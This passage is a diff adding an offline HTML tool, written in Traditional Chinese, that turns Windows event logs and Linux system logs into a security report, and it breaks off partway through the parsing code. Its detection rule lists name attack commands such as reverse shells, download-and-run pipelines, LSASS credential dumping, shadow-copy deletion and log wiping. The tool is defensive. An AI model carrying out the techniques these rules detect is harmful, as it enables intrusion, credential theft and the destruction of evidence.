@@ -1,0 +1,1108 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>主機記錄檔資安檢視工具 (Windows / Linux)</title>
+<style>
+:root{
+  color-scheme:light;
+  --page:#f9f9f7;--surface:#fcfcfb;--ink:#0b0b0b;--ink2:#52514e;--muted:#898781;
+  --grid:#e1e0d9;--axis:#c3c2b7;--border:rgba(11,11,11,.10);
+  --s1:#2a78d6;--s2:#eb6834;
+  --crit:#d03b3b;--high:#ec835a;--med:#fab219;--good:#0ca30c;--goodtext:#006300;
+  --wash:rgba(11,11,11,.04);
+}
+@media (prefers-color-scheme:dark){:root{
+  color-scheme:dark;
+  --page:#0d0d0d;--surface:#1a1a19;--ink:#f0efec;--ink2:#c3c2b7;--muted:#898781;
+  --grid:#2c2c2a;--axis:#383835;--border:rgba(255,255,255,.10);
+  --s1:#3987e5;--s2:#d95926;--goodtext:#0ca30c;--wash:rgba(255,255,255,.05);
+}}
+*{box-sizing:border-box}
+body{margin:0;background:var(--page);color:var(--ink);font:15px/1.6 system-ui,-apple-system,"Segoe UI","Microsoft JhengHei",sans-serif}
+.wrap{max-width:1240px;margin:0 auto;padding:20px 16px 80px}
+h1{font-size:24px;margin:0 0 4px}
+h2{font-size:19px;margin:36px 0 4px;padding-top:8px}
+h3{font-size:15px;margin:0 0 2px}
+.sub{color:var(--ink2);margin:0 0 12px;font-size:14px}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px}
+.privacy{display:inline-block;font-size:13px;color:var(--goodtext);border:1px solid var(--border);border-radius:99px;padding:2px 12px;margin:6px 0 14px;background:var(--surface)}
+#drop{border:2px dashed var(--axis);border-radius:12px;padding:28px 16px;text-align:center;background:var(--surface);cursor:pointer;transition:.15s}
+#drop.over{border-color:var(--s1);background:var(--wash)}
+#drop b{font-size:17px}
+button,select,input[type=text],input[type=number]{font:inherit;color:var(--ink);background:var(--surface);border:1px solid var(--axis);border-radius:7px;padding:5px 12px}
+button{cursor:pointer}button:hover{background:var(--wash)}
+button.primary{background:var(--s1);border-color:var(--s1);color:#fff}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+details.help{margin-top:10px;font-size:14px}
+details.help summary{cursor:pointer;color:var(--ink2)}
+pre{background:var(--wash);border-radius:7px;padding:10px;overflow:auto;font:12.5px/1.5 Consolas,monospace;margin:6px 0}
+#prog{height:6px;background:var(--grid);border-radius:9px;overflow:hidden;margin-top:12px;display:none}
+#prog i{display:block;height:100%;width:0;background:var(--s1)}
+#progtxt{font-size:13px;color:var(--ink2);min-height:20px}
+#report{display:none}
+nav{position:sticky;top:0;z-index:5;background:var(--page);padding:8px 0;border-bottom:1px solid var(--border);display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-top:18px}
+nav a{color:var(--ink2);text-decoration:none;padding:3px 10px;border-radius:99px;font-size:14px}
+nav a:hover{background:var(--wash);color:var(--ink)}
+nav .sp{flex:1}
+.verdict{border-left:6px solid var(--muted);font-size:16px;margin-top:16px}
+.verdict.v-bad{border-left-color:var(--crit)}.verdict.v-warn{border-left-color:var(--med)}.verdict.v-ok{border-left-color:var(--good)}
+.verdict b{font-size:20px}
+.tiles{display:grid;grid-template-columns:repeat(auto-fit,minmax(165px,1fr));gap:12px;margin-top:12px}
+.tile .lab{font-size:13px;color:var(--ink2)}
+.tile .val{font-size:30px;font-weight:650;line-height:1.2}
+.tile .hint{font-size:12px;color:var(--muted)}
+.grid2{display:grid;grid-template-columns:repeat(auto-fit,minmax(380px,1fr));gap:12px;margin-top:12px}
+.badge{display:inline-flex;align-items:center;gap:5px;font-size:12.5px;font-weight:600;border-radius:99px;padding:1px 10px 1px 8px;border:1px solid var(--border);white-space:nowrap;background:var(--surface);color:var(--ink)}
+.badge i{width:9px;height:9px;border-radius:50%;background:var(--muted);display:inline-block}
+.b-crit i{background:var(--crit)}.b-high i{background:var(--high)}.b-med i{background:var(--med)}.b-low i{background:var(--s1)}.b-ok i{background:var(--good)}
+.finding{margin-top:10px;padding:0;overflow:hidden;border-left:6px solid var(--muted)}
+.finding.f-crit{border-left-color:var(--crit)}.finding.f-high{border-left-color:var(--high)}.finding.f-med{border-left-color:var(--med)}.finding.f-low{border-left-color:var(--s1)}
+.finding summary{padding:12px 16px;cursor:pointer;display:flex;gap:10px;align-items:center;list-style:none}
+.finding summary::-webkit-details-marker{display:none}
+.finding summary .t{font-weight:600;flex:1}
+.finding summary::after{content:"▾";color:var(--muted)}
+.finding .body{padding:0 16px 14px}
+.finding .body p{margin:6px 0}
+.lbl{font-size:12.5px;color:var(--muted);font-weight:600;margin-top:10px}
+.advice{background:var(--wash);border-radius:7px;padding:8px 12px;margin-top:8px}
+table{border-collapse:collapse;width:100%;font-size:13.5px}
+th,td{text-align:left;padding:5px 8px;border-bottom:1px solid var(--grid);vertical-align:top}
+th{color:var(--ink2);font-weight:600;font-size:12.5px;white-space:nowrap}
+td.num,th.num{text-align:right;font-variant-numeric:tabular-nums}
+td.wrapcell{word-break:break-all;max-width:520px}
+.tblwrap{overflow:auto;max-height:560px}
+.chk td:first-child{white-space:nowrap}
+.bars{display:grid;grid-template-columns:minmax(90px,max-content) 1fr max-content;gap:5px 10px;align-items:center;font-size:13.5px;margin-top:8px}
+.bars .l{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:230px}
+.bars .l small{color:var(--muted);margin-left:5px}
+.bars .tr{height:14px;position:relative}
+.bars .tr i{display:block;height:100%;border-radius:0 4px 4px 0;background:var(--s1);min-width:2px}
+.bars .v{font-variant-numeric:tabular-nums;color:var(--ink2)}
+.bars.click .l,.bars.click .tr{cursor:pointer}
+.bars.click .tr:hover i,.bars.click .l:hover+.tr i{filter:brightness(1.15)}
+.bars.o .tr i{background:var(--s2)}
+.empty{color:var(--muted);font-size:13.5px;padding:14px 0}
+.legend{display:flex;gap:14px;font-size:13px;color:var(--ink2);margin-top:4px}
+.legend i{display:inline-block;width:10px;height:10px;border-radius:2px;margin-right:5px}
+svg text{fill:var(--muted);font-size:11px}
+.heat{display:grid;grid-template-columns:28px repeat(24,1fr);gap:2px;font-size:11px;color:var(--muted);margin-top:8px}
+.heat .c{aspect-ratio:1.25;border-radius:2px;background:var(--grid);position:relative;overflow:hidden}
+.heat .c i{position:absolute;inset:0;background:var(--s1)}
+.heat.o .c i{background:var(--s2)}
+.heat .c.off{outline:1px dashed var(--axis);outline-offset:-1px}
+.heat .hh{text-align:center}
+#tip{position:fixed;z-index:20;pointer-events:none;background:var(--ink);color:var(--page);font-size:12.5px;padding:5px 9px;border-radius:6px;display:none;max-width:320px;white-space:pre-line}
+.filters{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:8px 0}
+.filters input[type=text]{flex:1;min-width:180px}
+.pager{display:flex;gap:10px;align-items:center;justify-content:flex-end;font-size:13px;color:var(--ink2);margin-top:8px}
+.note{font-size:13px;color:var(--ink2)}
+.warnbox{border-left:6px solid var(--med);margin-top:12px;font-size:14px}
+.guide{margin-top:14px}
+.steps3{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:10px 0 14px}
+.steps3>div{background:var(--wash);border-radius:8px;padding:10px 12px}
+.steps3 b{display:block}.steps3 span{font-size:13.5px;color:var(--ink2)}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;border-bottom:1px solid var(--grid);padding-bottom:8px}
+.tab.on{background:var(--s1);border-color:var(--s1);color:#fff}
+.tabp ol,.faq{margin:6px 0;padding-left:24px}.tabp li,.faq li{margin:4px 0}
+kbd,code{font:13px Consolas,monospace;background:var(--wash);border:1px solid var(--border);border-radius:4px;padding:0 5px}
+.cmd{position:relative}.cmd .copy{position:absolute;right:8px;top:8px;font-size:13px;padding:2px 10px}
+.cmd pre{padding-top:38px}
+@media print{#guide{display:none!important}
+  #loader,nav,.filters,.pager,.noprint{display:none!important}
+  body{background:#fff}.card{break-inside:avoid}.tblwrap{max-height:none;overflow:visible}
+  .finding summary::after{content:""}
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>主機記錄檔資安檢視工具</h1>
+  <p class="sub">把 Windows 事件記錄檔或 Linux 系統記錄檔拖進來，自動整理成看得懂的資安檢查報表。</p>
+  <div class="privacy">🔒 檔案只在這台電腦的瀏覽器內分析，不會上傳到任何地方，離線也能使用</div>
+
+  <div id="loader">
+    <div id="drop">
+      <b>把記錄檔拖曳到這裡，或點一下選擇檔案</b><br>
+      <span class="note">可一次放多個檔案（Windows 與 Linux 可混合）。支援：.evtx、wevtutil 匯出的 XML、事件檢視器匯出的 CSV、Linux auth.log / secure / messages / syslog / audit.log / journalctl 輸出（.gz 也可以）</span>
+      <input id="file" type="file" multiple hidden>
+    </div>
+    <div class="row" style="margin-top:10px">
+      <button id="demo">沒有檔案？先看示範報表</button>
+      <button id="reset" style="display:none">清除並重新開始</button>
+      <span id="progtxt"></span>
+    </div>
+    <div id="prog"><i></i></div>
+    <div class="card guide" id="guide">
+      <h3 style="font-size:17px">第一次使用？照著 3 個步驟做</h3>
+      <div class="steps3">
+        <div><b>① 從主機取出記錄檔</b><span>依下方教學，把主機的「記錄檔」另存出來（不會影響主機運作）。</span></div>
+        <div><b>② 拖進上方的虛線框</b><span>可以一次放很多個檔案。檔案只在這台電腦上分析，不會傳到網路上。</span></div>
+        <div><b>③ 看報表</b><span>先看最上面的紅/黃/綠結論，再看「異常發現」與「定檢檢核表」。</span></div>
+      </div>
+
+      <div class="tabs" role="tablist">
+        <button class="tab on" data-tab="g-win">我的主機是 Windows</button>
+        <button class="tab" data-tab="g-lnx">我的主機是 Linux</button>
+        <button class="tab" data-tab="g-read">報表怎麼看</button>
+      </div>
+
+      <div class="tabp" id="g-win">
+        <p class="lbl">要放哪些檔案</p>
+        <div class="tblwrap" style="max-height:none"><table>
+          <tr><th>需要程度</th><th>記錄名稱</th><th>匯出後的檔名</th><th>用來檢查什麼</th></tr>
+          <tr><td><span class="badge b-crit"><i></i>一定要</span></td><td>安全性 (Security)</td><td>Security.evtx</td><td>登入成功/失敗、來源 IP、帳號與群組異動、記錄被清除</td></tr>
+          <tr><td><span class="badge b-med"><i></i>建議</span></td><td>系統 (System)</td><td>System.evtx</td><td>新安裝的服務、異常關機、記錄被清除</td></tr>
+          <tr><td><span class="badge b-low"><i></i>有更好</span></td><td>應用程式 (Application)</td><td>Application.evtx</td><td>軟體安裝/移除、程式當機</td></tr>
+          <tr><td><span class="badge b-low"><i></i>有更好</span></td><td>Windows Defender、PowerShell、遠端桌面、工作排程器</td><td>（用方法 B 一次匯出）</td><td>病毒偵測、可疑指令、遠端連線來源、排程異動</td></tr>
+        </table></div>
+
+        <p class="lbl">方法 A：用滑鼠操作（不熟指令的人用這個）</p>
+        <ol>
+          <li>在<b>要檢查的那台主機</b>上，按鍵盤 <kbd>Win</kbd> + <kbd>R</kbd>，輸入 <code>eventvwr.msc</code> 後按 Enter，開啟「事件檢視器」。</li>
+          <li>左邊點開「<b>Windows 記錄</b>」。</li>
+          <li>在「<b>安全性</b>」上按<b>滑鼠右鍵</b> →「<b>另存所有事件為…</b>」。</li>
+          <li>存檔類型維持「<b>事件檔案 (*.evtx)</b>」，檔名取 <code>Security</code>，存到桌面。若跳出「顯示資訊」視窗，選「不顯示資訊」即可。</li>
+          <li>對「<b>系統</b>」、「<b>應用程式</b>」重複步驟 3–4。</li>
+          <li>把存好的 .evtx 檔案複製到放這個網頁的電腦，拖進上方虛線框。</li>
+        </ol>
+        <p class="note">看不到「安全性」的內容或無法另存？代表目前帳號不是系統管理員，請改用管理員帳號登入，或對事件檢視器按右鍵「以系統管理員身分執行」。</p>
+
+        <p class="lbl">方法 B：用指令一次匯出全部（較快、內容最完整）</p>
+        <ol>
+          <li>按「開始」，輸入 <code>cmd</code>，在「命令提示字元」上按右鍵 →「<b>以系統管理員身分執行</b>」。</li>
+          <li>按下方「複製指令」，到黑色視窗按滑鼠右鍵貼上，再按 Enter。</li>
+          <li>完成後檔案會在 <code>C:\logs</code> 資料夾，把裡面的檔案全部拖進上方虛線框。</li>
+        </ol>
+        <div class="cmd"><button class="copy" data-copy="cmd-win">複製指令</button>
+<pre id="cmd-win">mkdir C:\logs
+wevtutil epl Security    C:\logs\Security.evtx /ow:true
+wevtutil epl System      C:\logs\System.evtx /ow:true
+wevtutil epl Application C:\logs\Application.evtx /ow:true
+wevtutil epl "Microsoft-Windows-Windows Defender/Operational" C:\logs\Defender.evtx /ow:true
+wevtutil epl "Microsoft-Windows-PowerShell/Operational" C:\logs\PowerShell.evtx /ow:true
+wevtutil epl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" C:\logs\RDP-Session.evtx /ow:true
+wevtutil epl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational" C:\logs\RDP-Connect.evtx /ow:true
+wevtutil epl "Microsoft-Windows-TaskScheduler/Operational" C:\logs\TaskScheduler.evtx /ow:true
+explorer C:\logs
+</pre></div>
+        <p class="note">出現「存取被拒 (Access is denied)」＝沒有用系統管理員身分執行。某幾行顯示找不到記錄檔沒關係，代表那台主機沒有該功能，其餘照常可用。</p>
+      </div>
+
+      <div class="tabp" id="g-lnx" hidden>
+        <p class="lbl">要放哪些檔案（依系統不同，檔名不一樣）</p>
+        <div class="tblwrap" style="max-height:none"><table>
+          <tr><th>需要程度</th><th>Ubuntu / Debian</th><th>RHEL / CentOS / Rocky / Alma</th><th>用來檢查什麼</th></tr>
+          <tr><td><span class="badge b-crit"><i></i>一定要</span></td><td>/var/log/auth.log</td><td>/var/log/secure</td><td>SSH 登入成功/失敗、來源 IP、sudo、帳號異動</td></tr>
+          <tr><td><span class="badge b-med"><i></i>建議</span></td><td>/var/log/syslog</td><td>/var/log/messages</td><td>開關機、服務異常、防火牆阻擋、排程</td></tr>
+          <tr><td><span class="badge b-low"><i></i>有更好</span></td><td colspan="2">/var/log/audit/audit.log（若有啟用 auditd）</td><td>登入與帳號異動的稽核紀錄</td></tr>
+        </table></div>
+        <p class="note">同名但後面多了 <code>.1</code>、<code>.2.gz</code> 的是較舊的記錄（例如 auth.log.1、auth.log.2.gz），請<b>一起放進來</b>，才看得到完整期間。.gz 壓縮檔不用解壓縮，直接拖進來即可。</p>
+
+        <p class="lbl">取出檔案的步驟</p>
+        <ol>
+          <li>用 SSH 登入主機（或在主機前開啟終端機）。</li>
+          <li>按「複製指令」貼上執行，會把記錄複製到家目錄的 <code>logs</code> 資料夾（需要輸入 sudo 密碼）。</li>
+          <li>用 WinSCP、FileZilla 或 scp 把 <code>logs</code> 資料夾下載到放這個網頁的電腦。</li>
+          <li>把資料夾裡的檔案全部選起來，拖進上方虛線框。</li>
+        </ol>
+        <div class="cmd"><button class="copy" data-copy="cmd-lnx">複製指令</button>
+<pre id="cmd-lnx">mkdir -p ~/logs
+sudo cp /var/log/auth.log* /var/log/secure* /var/log/syslog* /var/log/messages* /var/log/audit/audit.log* ~/logs/ 2>/dev/null
+sudo chown -R "$USER" ~/logs
+ls -lh ~/logs
+</pre></div>
+        <p class="lbl">找不到上面那些檔案？</p>
+        <p class="note">較新的系統可能只用 journal 保存記錄。請改執行下面這行，會產生一個 <code>journal.log</code>，把它拖進來即可。</p>
+        <div class="cmd"><button class="copy" data-copy="cmd-jr">複製指令</button>
+<pre id="cmd-jr">sudo journalctl -o short-iso --since "-180 days" > ~/journal.log
+</pre></div>
+      </div>
+
+      <div class="tabp" id="g-read" hidden>
+        <ol>
+          <li><b>先看「總覽」最上面的結論框</b>：紅色＝有高風險異常要盡快處理；黃色＝有事項需要確認；綠色＝沒有發現明顯異常。</li>
+          <li><b>再看「異常發現」</b>：每一項點開都有「這代表什麼」（白話解釋）、「證據」（哪個帳號、哪個 IP、什麼時間）和「建議處置」（該怎麼做）。</li>
+          <li><b>「定檢檢核表」</b>可直接當作檢查紀錄：逐項顯示 異常／需注意／有紀錄請確認／未發現異常／無資料。「無資料」表示還缺某個記錄檔，說明欄會寫需要哪一個。</li>
+          <li><b>「登入分析」的圖表</b>：橘色代表登入失敗。橘色突然暴增、或集中在半夜假日，通常就是有人在猜密碼。IP 旁標示「外網」表示來自網際網路。</li>
+          <li>需要留存或回報時，按右上角「<b>列印 / 存成 PDF</b>」。</li>
+        </ol>
+        <p class="lbl">名詞小抄</p>
+        <div class="tblwrap" style="max-height:none"><table>
+          <tr><th>名詞</th><th>白話意思</th></tr>
+          <tr><td>來源 IP</td><td>對方電腦的網路位址，用來辨識「是從哪一台電腦連進來的」</td></tr>
+          <tr><td>內網 / 外網</td><td>內網＝公司或機關內部的電腦；外網＝來自網際網路，任何地方都有可能</td></tr>
+          <tr><td>暴力破解</td><td>用程式不斷嘗試各種密碼，直到猜中為止</td></tr>
+          <tr><td>遠端桌面 (RDP) / SSH</td><td>從別台電腦遠端操作這台主機的方式（Windows 多用 RDP，Linux 多用 SSH）</td></tr>
+          <tr><td>服務 / 排程工作</td><td>會在背景自動執行的程式；惡意程式常藉此長期潛伏</td></tr>
+          <tr><td>sudo / 系統管理員權限</td><td>主機的最高權限，可以做任何事，所以要確認使用的人是誰</td></tr>
+        </table></div>
+        <p class="note">本工具是依據常見的攻擊特徵做自動判讀，目的是幫忙「找出值得注意的地方」。標示為異常不一定代表已被入侵，沒有標示也不保證絕對安全；有疑慮請洽資安人員。</p>
+      </div>
+
+      <p class="lbl">常見問題</p>
+      <ul class="faq">
+        <li><b>檔案很大可以嗎？</b>可以，幾百 MB 也能分析，只是需要等一下。</li>
+        <li><b>可以放多台主機的檔案嗎？</b>可以，但建議一次分析一台，報表比較好讀。換下一台前請按「清除並重新開始」。</li>
+        <li><b>哪些檔案不能用？</b>網站存取記錄 (IIS / Apache / Nginx)、資料庫或應用程式自己的 log、壓縮成 .zip / .tar 的檔案（請先解壓縮）。</li>
+        <li><b>檔案會外流嗎？</b>不會。這是一個離線網頁，所有分析都在你的瀏覽器內完成，關掉網頁資料就消失。</li>
+      </ul>
+    </div>
+  </div>
+
+  <div id="report">
+    <nav>
+      <a href="#s-sum">總覽</a><a href="#s-find">異常發現</a><a href="#s-chk">定檢檢核表</a><a href="#s-login">登入分析</a><a href="#s-ev">事件明細</a>
+      <span class="sp"></span>
+      <span class="note noprint">上班時間
+        <input id="ws" type="number" min="0" max="23" value="8" style="width:58px">–<input id="we" type="number" min="1" max="24" value="18" style="width:58px"> 時
+        猜密碼門檻 <input id="thr" type="number" min="3" value="10" style="width:64px"> 次</span>
+      <button onclick="printReport()">列印 / 存成 PDF</button>
+    </nav>
+
+    <h2 id="s-sum">總覽</h2>
+    <div id="meta" class="note"></div>
+    <div id="verdict" class="card verdict"></div>
+    <div id="notes"></div>
+    <div id="tiles" class="tiles"></div>
+
+    <h2 id="s-find">異常發現</h2>
+    <p class="sub">依嚴重程度排序。點開每一項可以看到「這代表什麼」、證據與建議處置。</p>
+    <div id="findings"></div>
+
+    <h2 id="s-chk">定檢檢核表</h2>
+    <p class="sub">資安定期檢查主機時常看的項目，逐項給出結果。「無資料」表示提供的檔案裡沒有該項目所需的記錄。</p>
+    <div class="card tblwrap" style="max-height:none"><table class="chk" id="checks"></table></div>
+
+    <h2 id="s-login">登入分析</h2>
+    <div class="card" style="margin-top:12px">
+      <h3>登入成功與失敗的時間分布</h3>
+      <div class="note">失敗次數突然暴增，通常代表有人（或程式）在猜密碼。</div>
+      <div class="legend"><span><i style="background:var(--s1)"></i>登入成功</span><span><i style="background:var(--s2)"></i>登入失敗</span></div>
+      <div id="timeline"></div>
+    </div>
+    <div class="grid2">
+      <div class="card"><h3>登入失敗最多的來源 IP</h3><div class="note">「外網」表示來自網際網路；點一下可查看該來源的事件。</div><div id="c-failip"></div></div>
+      <div class="card"><h3>登入失敗最多的帳號</h3><div class="note">被猜最多次的帳號名稱。</div><div id="c-failuser"></div></div>
+      <div class="card"><h3>登入失敗的原因</h3><div class="note">「帳號不存在」很多，代表有人在亂試帳號。</div><div id="c-reason"></div></div>
+      <div class="card"><h3>登入成功最多的帳號</h3><div class="note">不含系統與服務自己的登入。</div><div id="c-okuser"></div></div>
+      <div class="card"><h3>登入成功的來源 IP</h3><div class="note">確認這些來源是否都是認識的電腦。</div><div id="c-okip"></div></div>
+      <div class="card"><h3>登入方式</h3><div class="note">成功登入所使用的方式。</div><div id="c-ltype"></div></div>
+      <div class="card"><h3>成功登入的時段（星期 × 小時）</h3><div class="note">顏色越深次數越多；虛線框為非上班時間。</div><div id="h-ok"></div></div>
+      <div class="card"><h3>登入失敗的時段（星期 × 小時）</h3><div class="note">半夜或假日集中出現失敗，多半是自動化攻擊。</div><div id="h-fail"></div></div>
+      <div class="card"><h3>各類資安事件數量</h3><div class="note">點一下可在下方明細中篩選。</div><div id="c-kinds"></div></div>
+    </div>
+
+    <h2 id="s-ev">事件明細</h2>
+    <p class="sub">所有與資安相關的事件，已翻譯成白話說明。可用關鍵字（帳號、IP、主機）搜尋。</p>
+    <div class="card">
+      <div class="filters">
+        <select id="f-k"></select>
+        <select id="f-sev"><option value="">全部嚴重度</option><option value="4">嚴重</option><option value="3">高以上</option><option value="2">中以上</option><option value="1">低以上</option></select>
+        <input id="f-q" type="text" placeholder="搜尋帳號、IP、主機或說明…">
+        <button id="f-clear">清除篩選</button>
+        <button id="f-csv">匯出 CSV</button>
+      </div>
+      <div class="tblwrap"><table id="evtable"></table></div>
+      <div class="pager"><span id="pginfo"></span><button id="pgprev">上一頁</button><button id="pgnext">下一頁</button></div>
+    </div>
+  </div>
+</div>
+<div id="tip"></div>
+
+<script id="engine">
+'use strict';
+const Engine=(()=>{
+const DAY=86400000,HOUR=3600000,CAP=400000;
+const TZ=new Date().getTimezoneOffset()*60000;
+const inc=(m,k,n=1)=>m.set(k,(m.get(k)||0)+n);
+const p2=n=>String(n).padStart(2,'0');
+function fmt(t){if(!(t>0)||!isFinite(t))return '';const d=new Date(t);return d.getFullYear()+'-'+p2(d.getMonth()+1)+'-'+p2(d.getDate())+' '+p2(d.getHours())+':'+p2(d.getMinutes())+':'+p2(d.getSeconds());}
+const SEV={crit:4,high:3,med:2,low:1,info:0};
+
+function newState(){return{files:[],total:0,tmin:Infinity,tmax:-Infinity,hosts:new Map(),os:{},has:{},evs:[],dropped:0,
+  chan:new Map(),sysLogon:0,procCount:0,scan:new Map(),fwBlock:new Map(),errors:0,inv:new Map(),lastSu:''};}
+function note(st,t,ch){if(!(t>0))return;if(t<st.tmin)st.tmin=t;if(t>st.tmax)st.tmax=t;
+  let c=st.chan.get(ch);if(!c){c={n:0,tmin:t,tmax:t};st.chan.set(ch,c);}c.n++;if(t<c.tmin)c.tmin=t;if(t>c.tmax)c.tmax=t;}
+function push(st,e){if(st.evs.length<CAP)st.evs.push(e);else st.dropped++;}
+function cleanIp(ip){if(!ip)return '';ip=String(ip).trim().replace(/^::ffff:/i,'');
+  if(ip==='-'||ip==='::1'||ip==='127.0.0.1'||ip==='0.0.0.0'||/^(local|本機)/i.test(ip))return '';return ip;}
+function isPub(ip){return !!ip&&/^[0-9a-f:.]+$/i.test(ip)&&/[.:]/.test(ip)&&
+  !/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.|fe80:|f[cd][0-9a-f]{2}:)/i.test(ip);}
+const short=(s,n=260)=>{s=String(s==null?'':s).replace(/\s+/g,' ').trim();return s.length>n?s.slice(0,n)+'…':s;};
+
+/* ───────────── 可疑指令特徵 ───────────── */
+const SUSP_WIN=[
+ [/-e(nc(odedcommand)?)?\s+[A-Za-z0-9+\/=]{40,}|frombase64string/i,'執行經過編碼隱藏的 PowerShell 指令'],
+ [/downloadstring|downloadfile|invoke-webrequest[^|]*\|\s*iex|\biex\s*\(\s*new-object|net\.webclient/i,'從網路下載程式並執行'],
+ [/mimikatz|sekurlsa|lsadump|procdump[^|]*lsass|comsvcs(\.dll)?[\s,#]+.*minidump|rundll32[^|]*comsvcs/i,'嘗試竊取記憶體中的密碼 (LSASS)'],
+ [/vssadmin(\.exe)?"?\s+delete\s+shadows|wmic[^|]*shadowcopy\s+delete|bcdedit[^|]*recoveryenabled\s+no|wbadmin\s+delete/i,'刪除系統備份/還原點（勒索軟體常見手法）'],
+ [/wevtutil(\.exe)?"?\s+(cl|clear-log)\b|clear-eventlog|remove-eventlog/i,'以指令清除事件記錄'],
+ [/net1?(\.exe)?"?\s+user\s+\S+\s+\S+.*\/add|net1?(\.exe)?"?\s+localgroup\s+administrators\s+\S+.*\/add|new-localuser|add-localgroupmember/i,'以指令新增帳號或加入管理者群組'],
+ [/certutil[^|]*(-urlcache|-decode)|bitsadmin[^|]*\/transfer|mshta(\.exe)?"?\s+["']?(http|javascript|vbscript)|regsvr32[^|]*\/i:\s*http/i,'利用系統內建工具下載或執行外部程式'],
+ [/reg(\.exe)?"?\s+save\s+hklm\\(sam|system|security)|ntdsutil[^|]*ifm|ntds\.dit/i,'匯出系統密碼資料庫 (SAM / NTDS)'],
+ [/psexe(c|svc)|paexec|\\\\[^\\\s]+\\admin\$/i,'使用遠端執行工具 (PsExec / ADMIN$)'],
+ [/set-mppreference[^|]*-disable|add-mppreference[^|]*exclusion|netsh[^|]*(firewall|advfirewall)[^|]*(off|disable)|sc(\.exe)?"?\s+(stop|delete|config)\s+(windefend|eventlog|sense|mpssvc)/i,'以指令停用防毒、防火牆或記錄服務'],
+ [/-w(in(dowstyle)?)?\s+hid(den)?\b.*(-nop|bypass)|(-nop|bypass)\b.*-w(in(dowstyle)?)?\s+hid/i,'以隱藏視窗方式執行 PowerShell'],
+ [/meterpreter|cobaltstrike|invoke-(shellcode|reflectivepeinjection|kerberoast|bloodhound)|sharphound|rubeus/i,'出現已知駭客工具名稱'],
+];
+const SUSP_SVC=/\\(temp|tmp|appdata|programdata|users\\public|perflogs|downloads)\\|%comspec%|cmd(\.exe)?"?\s+\/c|powershell|pwsh|admin\$|psexesvc|\.(bat|cmd|ps1|vbs|js)\b|rundll32|mshta|regsvr32|^"?[a-z]:\\[^\\]+\.exe/i;
+const SUSP_LNX=[
+ [/(curl|wget)\b[^|;]*\|\s*(sudo\s+)?(ba|z|da)?sh\b/i,'從網路下載指令碼並直接執行'],
+ [/\b(nc|ncat|netcat)\b.*\s-[a-z]*e\b|\/dev\/tcp\/|bash\s+-i\s*>&|mkfifo\b.*\bnc\b|python[23]?\s+-c\s+.*(socket|pty\.spawn)/i,'建立反向連線（讓外部遠端操控）'],
+ [/\b(rm|shred|truncate)\b[^;|]*\/var\/log|>\s*\/var\/log\/|history\s+-c|unset\s+HISTFILE|\/dev\/null\s*>\s*~?\/?\.bash_history/i,'刪除或清空記錄檔 / 指令歷史'],
+ [/xmrig|minerd|cryptonight|kinsing|kdevtmpfsi|stratum\+tcp/i,'出現已知挖礦程式名稱'],
+ [/(iptables|nft)\s+(-F|flush)|ufw\s+disable|setenforce\s+0|systemctl\s+(stop|disable|mask)\s+(firewalld|ufw|auditd|rsyslog|apparmor)/i,'停用防火牆或安全機制'],
+ [/chmod\s+(-R\s+)?[0-7]?777\b|chmod\s+[ugoa]*\+s\b|chmod\s+[2467][0-7]{3}\b/i,'設定危險的檔案權限 (777 / SUID)'],
+ [/base64\s+(-d|--decode)[^|]*\|\s*(ba)?sh/i,'執行經過編碼隱藏的指令'],
+ [/authorized_keys/i,'修改 SSH 免密碼登入金鑰（可能被放後門）'],
+ [/\/etc\/(shadow|sudoers)\b|\bvisudo\b/i,'存取密碼檔或 sudo 權限設定'],
+ [/\b(useradd|adduser|userdel)\b|usermod\b.*-a?G\s*\S*(sudo|wheel|root)|passwd\s+root\b/i,'以指令新增/刪除帳號或提升權限'],
+];
+function suspect(list,s){if(!s)return null;for(const [re,why] of list)if(re.test(s))return why;return null;}
+
+/* ───────────── Windows 事件 → 統一事件 ───────────── */
+const LT={'2':'本機鍵盤螢幕登入','3':'網路登入（如共用資料夾）','4':'批次（排程工作）','5':'服務','7':'解除螢幕鎖定','8':'網路明文密碼登入','9':'以其他身分執行 (RunAs)','10':'遠端桌面 (RDP)','11':'快取帳密登入（離線）','12':'遠端桌面（快取）','13':'解除鎖定（快取）',ssh:'SSH 遠端登入',console:'主機前登入 (console)',other:'其他服務登入'};
+const SUB={'0xc0000064':'帳號不存在','0xc000006a':'密碼錯誤','0xc000006d':'帳號或密碼錯誤','0xc000006e':'帳號限制','0xc000006f':'不在允許登入的時段','0xc0000070':'不允許從這台電腦登入','0xc0000071':'密碼已過期','0xc0000072':'帳號已停用','0xc0000193':'帳號已過期','0xc0000224':'必須先變更密碼','0xc0000234':'帳號已被鎖定','0xc000015b':'此帳號未被授權使用這種登入方式','0xc0000133':'主機時間不同步','0xc000005e':'找不到可驗證的網域控制站','0xc0000413':'驗證防火牆拒絕','0xc00000dc':'伺服器狀態不正確','0xc0000192':'Netlogon 服務未啟動'};
+const KRB={'0x6':'帳號不存在','0x12':'帳號已停用/鎖定/過期','0x17':'密碼已過期','0x18':'密碼錯誤','0x25':'主機時間不同步'};
+const ADMGRP=/admin|remote desktop|backup operators|account operators|server operators|hyper-v|系統管理|遠端桌面|備份/i;
+function isSysUser(u,sid){u=u||'';return /\$$/.test(u)||/^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE|ANONYMOUS LOGON|DWM-\d+|UMFD-\d+|-|)$/i.test(u)||sid==='S-1-5-18'||sid==='S-1-5-19'||sid==='S-1-5-20';}
+
+function ingestWin(st,r){
+  st.total++;st.os.win=1;
+  const t=r.t,h=r.comp||'',id=r.id,d=r.d||{},da=r.da||[],prov=r.prov||'',p=prov.toLowerCase(),ch=r.ch||'';
